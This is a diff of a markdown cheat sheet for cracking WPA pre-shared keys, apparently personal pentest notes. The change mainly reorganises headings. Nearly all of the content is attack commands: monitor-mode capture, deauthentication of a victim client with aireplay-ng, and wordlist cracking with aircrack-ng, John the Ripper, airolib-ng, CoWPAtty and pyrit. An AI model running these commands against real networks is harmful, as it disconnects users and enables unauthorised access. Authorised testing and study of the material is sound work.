@@ -72,33 +72,28 @@ aircrack-ng <.CAP FILENAME>
 
 ### Pre-Shared Key Authentication
 
-#### Cracking WPA with connected clients
+#### Cracking WPA with Aircrack-ng
 
 ```
 airmon-ng start <INTERFACE> <channel>
 airodump-ng -c <CHANNEL> --bssid <BSSID> -w <FILENAME> wlan0mon
 aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon
+aircrack-ng -w <WORDLIST> <.CAP FILENAME>
 ```
 
-> John the Ripper (JTR)
+#### Cracking WPA with John the Ripper (JTR)
 
 ```
 ./john --wordlist=<WORDLIST> --rules --stdout | aircrack-ng -e <ESSID> -w - <.CAP FILENAME>
 ```
 
-> Airolib-ng
+#### Cracking WPA with Airolib-ng
 
 ```
 aircrack-ng -r <DB NAME> <.CAP FILENAME>
 ```
 
-> Aircrack-ng
-
-```
-aircrack-ng -w <WORDLIST> <.CAP FILENAME>
-```
-
-> CoWPAtty
+#### Cracking WPA with CoWPAtty
 
 ```
 cowpatty -r <.CAP FILENAME> -f <WORDLIST> -2 -s <ESSID>
@@ -112,13 +107,13 @@ pyrit -r <INTERFACE> -o <FILENAME> stripLive
 aireplay-ng -0 1 -a <BSSID> -c <MAC VICTIM> wlan0mon
 ```
 
-> Dictionary mode
+##### Dictionary mode
 
 ```
 pyrit -r <.CAP FILENAME> -i <WORDLIST> -b <BSSID> attack_passthrough
 ```
 
-> Database mode
+##### Database mode
 
 ```
 pyrit -i <WORDLIST> import_passwords
